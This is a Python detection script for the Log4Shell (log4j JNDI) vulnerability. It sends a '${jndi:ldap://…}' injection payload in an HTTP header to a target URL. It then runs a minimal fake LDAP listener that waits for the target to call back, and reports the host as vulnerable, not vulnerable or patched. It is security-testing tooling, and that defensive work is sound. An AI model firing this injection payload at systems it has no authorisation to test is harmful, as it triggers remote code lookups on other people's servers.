#!/usr/bin/env python3
#------------------------------------------------------------------------------
# log4sh-detect.py
#
# Tests the Specified Host for the log4shell Vulnerability.
#
# NOTE(s):
#
#   * Morty and Morty's Creations ASSUMES ZERO LIABILITY relating to the
#     results obtained by this script.
#
#   * The exploit *REQUIRES* that the host being exploited can connect BACK
#     to a "rogue" server for further command.
#
#   * The protocol used to trigger an outbound connection on the exploited
#     host is IRRELEVANT (besides a WAF Blocking Action which may hit ONLY
#     a SPECIFIC protocol).
#
#   * The host being used to run the (this) Detection Program MUST BE ABLE
#     TO BIND to the port sent within the exploit.
#
#       - This means that firewall (and / or Malware Apps) on the host running
#         this script needs access to open a Listening Port.
#
#       - Attempting to run this script OVER THE INTERNET will require the
#         host running this script to either be FULLY INTERNET FACING or have
#         a Port Map from the Externally-Facing IP / Port to the host
#         running this script.
#
# Morty
# Copyright (c) 2021 by Morty's Creations - 2021-12-14
#------------------------------------------------------------------------------
# IMPORTS
#------------------------------------------------------------------------------
from    pprint                      import      (pprint, pformat)
from    datetime                    import      (datetime)
from    threading                   import      (Thread, Event)
try:
  from threading import Queue
except:
  try:
    from queue import Queue
  except:
    pass
import  getopt
import  os
import  random
import  requests
import  select
import  signal
import  socket
import  string
import  struct
import  sys
import  time
import  urllib.request
import  urllib3
#------------------------------------------------------------------------------
_                       = [
  pprint,
  pformat,
  time
]
#------------------------------------------------------------------------------
PROGRAM                 = os.path.basename(sys.argv[0])
VERSION                 = "1.5"
REVISION                = "20211218-1"
AUTHOR                  = "Morty (Morty's Creations)"
#------------------------------------------------------------------------------
# GLOBALS / CONSTANTS
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
RETVAL_NOT_VULNERABLE   = 0
RETVAL_VULNERABLE       = 1
RETVAL_NO_TEST          = 2
RETVAL_TEST_FAILED      = 3
RETVAL_PATCHED          = 4
#------------------------------------------------------------------------------
NETWORK_DIR_LABELS      = {
  "Receive"             : " <-- ",
  "Send"                : " --> ",
}
#------------------------------------------------------------------------------
PROXY_NONE              = {
  "http"                : None,
  "https"               : None,
}
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
def DATETIME_STRING()   :
  return(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
#------------------------------------------------------------------------------
WANT_EXCEPTIONS         = False
#------------------------------------------------------------------------------
LEN_RAND_DATA           = 30
#------------------------------------------------------------------------------
PORT_EXPLOIT_CB_DEF     = 1389
#------------------------------------------------------------------------------
HEADER_NAME_EXPLOIT     = "X-Api-Version"
#------------------------------------------------------------------------------
TIMEOUT_EXPLOIT_CB      = 10.0
#------------------------------------------------------------------------------
TIMEOUT_SOCKET_SELECT   = 2.0
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
LDAP_BIND_SUCCESS       = (
    b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
g_debug                 = False
g_resultOnly            = False
g_evtAppExit            = Event()
#------------------------------------------------------------------------------
g_tcpThread             = None
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------

class TCPThread(Thread):

  #----------------------------------------------------------------------------
  
  def __init__(
        self,
        addr            = None,
        port            = 1389,
        timeout         = TIMEOUT_EXPLOIT_CB,
        searchString    = None):
  
    Thread.__init__(self)
    
    self._addr          = (addr or TCPThread.getPrimaryIP())
    self._port          = port
    
    self._socket        = None
    self._evtTerm       = Event()
    
    self._timeout       = (timeout * 1000)
    self._searchString  = searchString
    
    self._portTestDone  = False
    
    self._result        = False
    
    self._clients       = {}
    
    self._qLog          = Queue()

  #----------------------------------------------------------------------------
  
  def begin(self):
  
    self._debug("TCPThread: begin()")
    
    ret = None
    
    try:
      self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self._socket.setblocking(0)
      if(self._socket is not None):
        self._port = self.bindToPort(self._port)
        if(self._port is not None):
          self._socket.listen(1)
          self.start()
          ret = self._port
    except:
      self._socket  = None
      ret           = None
      if(WANT_EXCEPTIONS): raise

    return(ret)

  #----------------------------------------------------------------------------
  
  @staticmethod
  def socketShutdown(sock, qLog:Queue):
  
    ret = False
    
    #addr = ":".join(sock.get("raddr", ""))
    addr = TCPThread.getSocketInfo(sock)
    
    try:
      sock.setsockopt(socket.SOL_SOCKET,
            socket.SO_LINGER,
            struct.pack('ii', 1, 0))
      sock.shutdown(socket.SHUT_RDWR)
      sock.close()
      ret = True
    except Exception as e:
      qLog.put("TCPThread::socketClose - EXCEPTION [socket = %s]: %s" %
            (addr, str(e)))
      if(WANT_EXCEPTIONS): raise

    if(g_debug):
      qLog.put("TCPThread::socketClose [socket = %s]: cleanup Complete: %s" %
            (addr, str(ret)))

    return(ret)  
  
  #----------------------------------------------------------------------------
    
  def cancel(self):
  
    self._debug("TCPThread::cancel BEGIN")
    
    if(self._evtTerm is not None):
      self._evtTerm.set()

  #----------------------------------------------------------------------------
  
  def getResult(self):
  
    return(self._result)
  
  #----------------------------------------------------------------------------

  def run(self):
  
    # The Socket Server uses NON-BLOCKING Sockets (via select()) so that we
    # can (gracefully) terminate as needed.
    
    # This function is long and messy, and can probably be modularized for
    # neater code, but my goal was to encapsulate this into a SINGLE SCRIPT,
    # so leaving it as-is for now!
    
    self._debug("TCPThread::run() BEGIN")

    sockList    = [self._socket]
    
    msStart     = time.time() * 1000
    
    while (not self._evtTerm.is_set()):
    
      # self._debug("About to Wait for Socket select()...")
      (rr, rw, err) = select.select(sockList,
            sockList,
            sockList,
            TIMEOUT_SOCKET_SELECT)
      # self._debug("Socket select() Complete:\n  rr  = %d\n  rw  = %d\n  err = %d" %
      #      (len(rr), len(rw), len(err)))
      for rs in rr:
        # READABLE SOCKETS:
        if(rs == self._socket):
          # READABLE LISTENER (SERVER) SOCKET:
          (conn, addr) = rs.accept()
          self._clients[conn] = {
            "state"     : "init",
            "addr"      : ("%s:%d" % (addr[0], addr[1])),
            "conn"      : conn,
          }
          self._debug("Received Connection on Port %d from %s:%d%s" % (
                self._port,
                addr[0],
                addr[1],
                (" [CALLBACK_PORT_TEST_NOT_EXPLOIT]"
                        if(not(self._portTestDone)) else "")))
          if(not(self._portTestDone)):
            self._portTestDone = True
          conn.setblocking(0)
          sockList.append(conn)
        else:
          # READABLE CLIENT SOCKET
          client = self._clients.get(rs, None)
          if(client is not None):
            data        = rs.recv(1024)
            dataAscii   = TCPThread.decodeToAscii(data)
            if(data):
              if(g_debug):
                TCPThread.hexdump(data, rs, self._qLog, "Receive")
              if(client["state"] == "init"):
                client["state"] = "ldap_bind_request_received"
              elif(client["state"] == "ldap_bind_success_sent"):
                if(self._searchString is not None):
                  if(self._searchString in dataAscii):
                    self._result = True
                    self._debug("TCPThread/run(): Search String Found: %s" %
                            (self._searchString))
                    break
            else:
              self._debug("Connection Closed: %s" % (client["addr"]))
              sockList.remove(rs)

      for ws in rw:
        # WRITABLE SOCKETS
        client = self._clients.get(ws, None)
        if(client is not None):
          if(client["state"] == "ldap_bind_request_received"):
            ws.send(LDAP_BIND_SUCCESS)
            self._debug("Sent LDAP Bind Success to Client: %s" % (client["addr"]))
            client["state"] = "ldap_bind_success_sent"
          elif(client["state"] == "ldap_bind_success_sent"):
            pass
      
      for es in err:
        # ERROR SOCKET
        client = self._clients.get(es, None)
        if(client is not None):
          self._debug("Socket Error: %s" % (client["addr"]))
          es.close()
          del self._clients[es]
          sockList.remove(es)
      
      if(self._result):
        self._debug("TCPThread.run(): Search String Found; Exiting Thread...")
        break
      elif(((time.time() * 1000) - msStart) >= self._timeout):
        self._debug("TCPThread.run(): Timeout Reached [%d]; Exiting Thread..." %
                (self._timeout))
        break  

    sockList.reverse()
    for sock in sockList:
      if(sock is not None):
        TCPThread.socketShutdown(sock, self._qLog)
        sockList.remove(sock)

    self._debug("TCPThread::run() COMPLETE")          
      

  #----------------------------------------------------------------------------
    
  def bindToPort(self, port = None):

    ret  = None
    
    if(self._socket is not None):
      if(port is None):
        for port in range(10000, 32767):
          try:
            self._socket.bind((self._addr, port))
            self._debug("Socket Bound to %s:%d..." % (self._addr, port))
            ret = port
            break
          except:
            pass
      else:
        try:
          self._socket.bind((self._addr, port))
          self._debug("Socket Bound to %s:%d..." % (self._addr, port))
          ret = port
        except:
          if(WANT_EXCEPTIONS): raise
    
    return(ret)
    
  #----------------------------------------------------------------------------
  
  def _debug(self, msg, rawLine = False):

    if(g_debug):
      if(rawLine):
        self._qLog.put("%s" % (msg))
      else:
        self._qLog.put("%s [DEBUG] %s" % (
                DATETIME_STRING(),
                    msg))

  #----------------------------------------------------------------------------
  
  def flushDebugQueue(self, file = sys.stderr):
  
    while(self._qLog.qsize() > 0):
      line = self._qLog.get()
      self._qLog.task_done()
      print(line, file = file)
  
  #----------------------------------------------------------------------------
  
  @staticmethod
  def getSocketInfo(sock, separator = " "):
  
    ret = "[not_connected]"
    
    try:
      ret = ("%s:%d%s%s:%d" % (
            *sock.getsockname(),
            separator,
            *sock.getpeername()))
    except:
      ret = "[not_connected]"
    
    return(ret)
  
  #----------------------------------------------------------------------------

  @staticmethod
  def decodeToAscii(data):
  
    ret = None
    
    if(type(data) is bytes):
      try:
        ret  = data.decode("iso-8859-1")
      except:
        ret  = None
        if(WANT_EXCEPTIONS): raise
    
    return(ret)

  #----------------------------------------------------------------------------

  @staticmethod
  def hexdump(dataIn, sock:socket, qLog:Queue, action = "Receive"):

    data = None
    
    if(type(dataIn) is bytes):
      try:
        data = TCPThread.decodeToAscii(dataIn)
      except Exception as e:
        _     = e
        data  = None
        if(WANT_EXCEPTIONS): raise
    else:
      data = dataIn
    
    """
0000   00 01 02 03 04 05 06 07  08 09 10 11 12 13 14 15   ........ ........
YYYY-MM-DD HH:MM:SS 255.255.255.255:32767 --> 255.255.255.255:32767
    """
    
    if(data is None):
      return
      
    offset = 0

    qLog.put("\n%-19s  %-47s  %d bytes" % (
            DATETIME_STRING(),
            TCPThread.getSocketInfo(sock,
                    NETWORK_DIR_LABELS.get(action, " ")),
            len(data)))

    while (len(data) > 0):
      endIdx = (15 if(len(data) >= 16) else len(data))
      line   = data[0:endIdx]
      strHex = ""
      strAsc = ""
      for bi in range(0, len(line)):
        if((bi > 0) and (bi % 8 == 0)):
          strHex += " "
          strAsc += " "
        strHex += (" %02x" % (ord(line[bi])))
        if((ord(data[bi]) >= ord(' ')) and (ord(line[bi]) <= ord('~'))):
          strAsc += chr(ord(line[bi]))
        else:
          strAsc += "."
      qLog.put("%-04s   %-48s   %s" % (
                ("{:04x}".format(offset)),
                strHex,
                strAsc))
      if(endIdx < 15):
        break
      else:
        data = data[16:]
      offset += len(line)
    
    print("", file = sys.stderr)
  
  #----------------------------------------------------------------------------
  
  @staticmethod
  def getPrimaryIP():
  
    ret = None
    
    try:
      hn = socket.gethostname()
      if(hn is not None):
        ret = socket.gethostbyname(hn)
    except:
      ret = None
      if(WANT_EXCEPTIONS): raise
    
    return(ret)
  
  #----------------------------------------------------------------------------
  
  @staticmethod
  def waitForThread(t, cancel = False):
  
    ret     = None
    
    joined  = False
    
    if(cancel):  t.cancel()
    
    while not joined:
      try:
        t.join(500)
        if(not(t.is_alive())):
          joined  = True
          ret     = t.getResult()
        t.flushDebugQueue()
      except:
        pass
  
    return(ret)    
  
  #----------------------------------------------------------------------------
  #----------------------------------------------------------------------------
  
    

#------------------------------------------------------------------------------
#------------------------------------------------------------------------------

def usage():

  print("\n%s v%s Rev%s\n%s\n" % (PROGRAM, VERSION, REVISION, AUTHOR))
  print("Usage: %s [-erTWx] [--skip-http-test] [-i|p|h|t <arg>] <url>" % (
        PROGRAM))

  print("""
OPTIONS:

  -h | --help                       this message
  url                               url to test for exploit
  -d | --debug                      enable debugging output
  -e | --exploit-only               send exploit request ONLY (NO RESULT)
  -r | --result-only                results only (no status)
  -i | --ip-callback    <ip>        ip for exploit callback
  -p | --port-callback  <port | a>  port for exploit callback (a* = auto)
  -H | --header         <hdr_name>  header name sent in exploit
  -t | --timeout        <timeout>   timeout for exploit in seconds
  -T | --skip-callback-test         skip reachability test [NOT RECOMMENDED!]
  -x | --use-system-proxy           send exploit request via Proxy
  -W | --disable-warnings           disable warnings [NOT RECOMMENDED!]
       --skip-http-test             skip http test [NOT RECOMMENDED!]

""")  

  print("""

NOTES / **DISCLAIMER**:

  * The exploit *REQUIRES* that the host being exploited can connect BACK
    to a "rogue" server for further command.

  * The protocol used to trigger an outbound connection on the exploited
    host is IRRELEVANT (besides a WAF Blocking Action which may hit ONLY
    a SPECIFIC protocol).

  * The host being used to run the (this) Detection Program MUST BE ABLE
    TO BIND to the port sent within the exploit.

      - This means that firewall (and / or Malware Apps) on the host running
        this script needs access to open a Listening Port.

      - Attempting to run this script OVER THE INTERNET will require the
        host running this script to either be FULLY INTERNET FACING or have
        a Port Map from the Externally-Facing IP / Port to the host
        running this script.

  * RETURN VALUES:
  
      VALUE     TEST_STATUS         VULNERABLE
      0         SUCCEEDED           NO
      1         SUCCEEDED           YES
      2         NOT PERFORMED       N/A             [Script Usage Only]
      3         FAILED              N/A
      4         SUCCEEDED           NO (PATCHED)    [NEW v1.5]

  * Morty and Morty's Creations ASSUMES ZERO LIABILITY relating to the
    results obtained by this script.
    
    ** USE AT YOUR OWN RISK **

""")

  sys.exit(RETVAL_NO_TEST)

#------------------------------------------------------------------------------

def debug(msg, file = sys.stderr, extraLineFeed = True):

  if(g_debug):
    print("%s [DEBUG] %s%s" % (
                DATETIME_STRING(),
                msg,
                ("\n" if(extraLineFeed) else "")),
            file = file)

#------------------------------------------------------------------------------

def quote(s):

  if(" " in s):
    if(len(s) > 0):
      if(s[0]  != "\""):  s = "\"" + s
      if(s[-1] != "\""):  s = s + "\""
  
  return(s)

#------------------------------------------------------------------------------

def printStatus(action, file = sys.stderr, **kwargs):

  if(not(g_resultOnly)):

    print("%s %s" % (DATETIME_STRING(), action), file = file)

    for k in kwargs:
      print("%-30s %s" % (k, str(kwargs[k])), file = file)
  
    print("", file = file)

#------------------------------------------------------------------------------

def errorexit(msg):

  print(msg, file = sys.stderr)
  exit(RETVAL_TEST_FAILED)

#------------------------------------------------------------------------------

def signalHandler(signum, frame):

  global g_evtAppExit

  debug("signalHandler: Caught Signal %d..." % (signum))
  
  if(g_tcpThread is not None):
    g_tcpThread.cancel()

  if(g_evtAppExit is not None):
    g_evtAppExit.set()

#------------------------------------------------------------------------------

def exploitCBTestWarning():

  print("""
WARNING! WARNING! WARNING! Skip Callback Test Specified!

  * The Callback Test validates the return path to this test script!
  * If the Callback IP / Port is UNREACHABLE, RESULTS MAY BE INVALID!
  * [Morty certainly hopes you know what the heck you're doing!]
""")

#------------------------------------------------------------------------------

def proxyWarning():

  print("""
WARNING! WARNING! WARNING! System Proxy Set but NOT USED!

  * A system proxy was detected, but the script is OVERRIDING IT!
  * This can be overriden via the (-x or --use-system-proxy) option.
  * Sending the Exploit Request via Proxy IS PERFECTLY VALID, but, of course,
    can be troublesome for testing INTERNAL SYSTEMS.
""")


#------------------------------------------------------------------------------

def exploitCBTest(exploitCBIP, exploitCBPort):

  ret   = False
  
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((exploitCBIP, exploitCBPort))
    sock.close()
    ret = True
  except:
    ret = False
  
  return(ret)

#------------------------------------------------------------------------------

def sendExploitedRequest(
        url,
        exploitHeaderName   = "X-Api-Version",
        exploitCBIP         = None,
        exploitCBPort       = 1389,
        exploitCBUserData   = None,
        useProxy            = False,
        requestTimeout      = 8.0,
        noExploit           = False):

  try:
    urllib3.disable_warnings()
  except:
    pass
  
  proxies   = (PROXY_NONE if(not(useProxy)) else urllib.request.getproxies())

  # ${jndi:ldap://${LDAP_HOST}:${LDAP_PORT}/${LDAP_USERDATA}}

  ret               = {
    "succeeded"     : False,
    "status"        : -1,
    "error"         : "",
    }
  
  if(not(noExploit)):
    headers     = {
                exploitHeaderName: ("${jndi:ldap://%s:%d/%s}" % (
                    exploitCBIP,
                    exploitCBPort,
                    exploitCBUserData))
                }
  else:
    headers    = {}
  
  if("://" in url):
    (p, u) = url.split("://")
    protos = [p]
    url    = u
  else:
    protos = ["http", "https"]

  for proto in protos:
    try:
      session           = requests.Session()
      session.trust_env = useProxy
      response = session.get(
            ("%s://%s" % (proto, url)),
            verify      = False,
            headers     = headers,
            proxies     = proxies,
            timeout     = requestTimeout)
      ret["succeeded"]  = True
      ret["status"]     = response.status_code
      break
    except Exception as e:
      ret["succeeded"]  = False
      ret["error"]      = str(e)
      if(WANT_EXCEPTIONS): raise
            
  return(ret)

#------------------------------------------------------------------------------

def isSystemProxyEnabled():

  ret = None
  
  try:
    proxies = urllib.request.getproxies()
    if((proxies != {}) and (proxies != PROXY_NONE)):
      ret = True
    else:
      ret = False
  except:
    ret = None

  debug("isSystemProxyEnabled: %s" % (
        ("[DETECTION_FAILED]" if(ret is None) else (str(ret)))))
  
  return(ret)

#------------------------------------------------------------------------------

def main():

  ## Globals Modified in Function
  global g_tcpThread
  global g_debug
  global g_resultOnly
  
  ## Status Variables  
  retval            = RETVAL_TEST_FAILED
  cbOk              = None
  cbTestSkipped     = False
  proxyEnabled      = False
  exploitSucceeded  = False
  httpTestSucceeded = False

  ## Option Initialization
  exploitOnly       = False
  exploitHeaderName = HEADER_NAME_EXPLOIT
  exploitCBIP       = TCPThread.getPrimaryIP()
  exploitCBPort     = PORT_EXPLOIT_CB_DEF
  exploitCBUserData = None
  exploitCBTimeout  = TIMEOUT_EXPLOIT_CB
  useProxy          = False
  disableWarnings   = False
  skipHTTPTest      = False

  ## Option Processing      BEGIN   ------------------------------------------
  for sig in [signal.SIGINT, signal.SIGTERM]:
    try:
      signal.signal(sig, signalHandler)
    except:
      print("WARNING: Failed to trap Signal %d" % (sig), file = sys.stderr)

  try:
    opts, args = getopt.getopt(sys.argv[1:], "hdeH:i:p:rTxW", \
            [
            "help",
            "debug",
            "ip-callback",
            "port-callback",
            "exploit-only",
            "header=",
            "result-only",
            "skip-callback-test",
            "use-system-proxy",
            "disable-warnings",
            "skip-http-test",
            ])
  except getopt.GetoptError as err:
    _ = err       # Reserved for Future Use!
    usage()
  
  for o, a in opts:
    if o in ("-h", "--help"):
      usage()
    elif(o in ("-d", "--debug")):
      g_debug               = True
    elif(o in ("-e", "--exploit-only")):
      exploitOnly           = True
    elif(o in ("-H", "--header")):
      exploitHeaderName     = a
    elif(o in ("-i", "--ip-callback")):
      exploitCBIP           = a
    elif(o in ("-p", "--port-callback")):
      if(len(a) > 0):
        if(a.lower()[0] == "a"):
          exploitCBPort       = None
        else:
          try:
            exploitCBPort     = int(a)
          except ValueError:
            errorexit("Invalid Port Value: %s" % (a))
    elif(o in ("-r", "--result-only")):
      g_resultOnly          = True
    elif(o in ("-t", "--timeout-callback")):
      try:
        exploitCBTimeout    = int(a)
      except ValueError:
        errorexit("Invalid Callback Timeout Value: %s" % (a))
    elif(o in ("-T", "--skip-callback-test")):
      cbOk                  = True
      cbTestSkipped         = True
    elif(o in ("-x", "--use-system-proxy")):
      useProxy              = True
    elif(o in ("-W", "--disable-warnings")):
      disableWarnings       = True
    elif(o in ("--skip-http-test")):
      skipHTTPTest          = True
    else:
      usage()

  if(len(args) < 1):
    usage()
  
  url = args[0]

  ## Option Processing      END     ------------------------------------------
  ## Test Setup             BEGIN   ------------------------------------------

  if(not(useProxy)):
    proxyEnabled = isSystemProxyEnabled()
    if(proxyEnabled is None):
      pass

  if(not(skipHTTPTest)):
    printStatus(
            "Sending HTTP Request WITHOUT EXPLOIT for Connectivity Test",
            url                 = url)
  
    reqStatus = sendExploitedRequest(
            url,
            useProxy            = useProxy,
            noExploit           = True)

    printStatus(
            "Exploit HTTP Request Sent",
            url                 = url,
            succeeded           = str(reqStatus["succeeded"]),
            http_status         = str(reqStatus["status"]),
            error               = reqStatus["error"])
  
    if((not(reqStatus.get("succeeded", False))) or
            (reqStatus.get("status", -1) < 0)):
      errorexit("Failed to Send Test HTTP Request (RESULTS WILL BE INVALID); Exiting!")
    else:
      httpTestSucceeded = True

  if(exploitCBUserData is None):
    exploitCBUserData = ("".join(random.choice(string.ascii_lowercase)
        for i in range(LEN_RAND_DATA)))
    debug("Random User Data String [len = %2d]: %s" %
            (len(exploitCBUserData), exploitCBUserData))

  if(not(exploitOnly)):
    try:
      g_tcpThread = TCPThread(
            timeout         = exploitCBTimeout,
            searchString    = exploitCBUserData,
            port            = exploitCBPort)
      exploitCBPort = g_tcpThread.begin()
      g_tcpThread.flushDebugQueue()
      if(exploitCBPort is None):
        errorexit("Failed to bind local listener port; Fatal Error...")
      printStatus(
            "Local Callback Listener Opened",
            port            = str(exploitCBPort))
    except Exception as e:
      errorexit("Failed to start TCP Thread: %s; Exiting..." %
            (str(e)))
  
 
  ## Test Setup             END     ------------------------------------------
  ## Test Validation        BEGIN   ------------------------------------------

    if(not(cbOk)):
      printStatus("Validating Callback IP / Port reachability...")
      cbOk = exploitCBTest(exploitCBIP, exploitCBPort)
      printStatus("Callback IP / Port reachability Test",
            exploitCBIP     = exploitCBIP,
            exploitCBPort   = exploitCBPort,
            status          = ("SUCCEEDED" if(cbOk) else "FAILED"))
      if(not(cbOk)):
        TCPThread.waitForThread(g_tcpThread,  cancel = True)
        errorexit("Callback IP / Port Reachability Test FAILED; " +
                "Fatal Error...")

  ## Test Validation        END     ------------------------------------------
  ## Exploit Test           BEGIN   ------------------------------------------

  if(g_tcpThread is not None):  g_tcpThread.flushDebugQueue()
  
  printStatus(
        "Sending Exploit HTTP Request",
        url                 = url)
  
  reqStatus = sendExploitedRequest(
        url,
        exploitHeaderName   = exploitHeaderName,
        exploitCBIP         = exploitCBIP,
        exploitCBPort       = exploitCBPort,
        exploitCBUserData   = exploitCBUserData,
        useProxy            = useProxy)

  if(g_tcpThread is not None):  g_tcpThread.flushDebugQueue()

  printStatus(
        "Exploit HTTP Request Sent",
        url                 = url,
        succeeded           = str(reqStatus["succeeded"]),
        http_status         = str(reqStatus["status"]),
        error               = reqStatus["error"])

  if((reqStatus.get("succeeded", False)) and
        (reqStatus.get("status", -1) > -1)):
  
    if(not(exploitOnly)):
      printStatus(
            "Wait for Exploited Host Callback",
            callbackIP      = exploitCBIP,
            callbackPort    = exploitCBPort,
            callbackTimeout = exploitCBTimeout)
      try:
        exploitSucceeded = TCPThread.waitForThread(g_tcpThread)
        retval           = (RETVAL_VULNERABLE if(exploitSucceeded)
                else RETVAL_NOT_VULNERABLE)
      except InterruptedError:
        pass
      
      if(not(g_evtAppExit.is_set())):
        print("%-40s [%s]" % (
                url,
                ("VULNERABLE" if(exploitSucceeded) else "not_vulnerable")))
      else:
        print("%-40s [%s]" % (
                url,
                "NO_RESULT_USER_CANCELLED"))
  else:
    if(g_tcpThread):
      TCPThread.waitForThread(g_tcpThread, cancel = True)
    if(httpTestSucceeded):
      exploitSucceeded  = False
      retval            = RETVAL_PATCHED
      print("%-40s [%s]" % (
            url,
            "PATCHED"))
    else:
      print("%-40s [%s]" % (
            url,
            "TEST_FAILED"))

  if(not(disableWarnings) and not(exploitSucceeded)):
    if(cbTestSkipped):  exploitCBTestWarning()
    if(proxyEnabled):   proxyWarning()

  ## Exploit Test           END     ------------------------------------------

  return(retval)

#------------------------------------------------------------------------------

if(__name__ == "__main__"):

  try:
    sys.exit(main())
  except KeyboardInterrupt:
    pass

#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
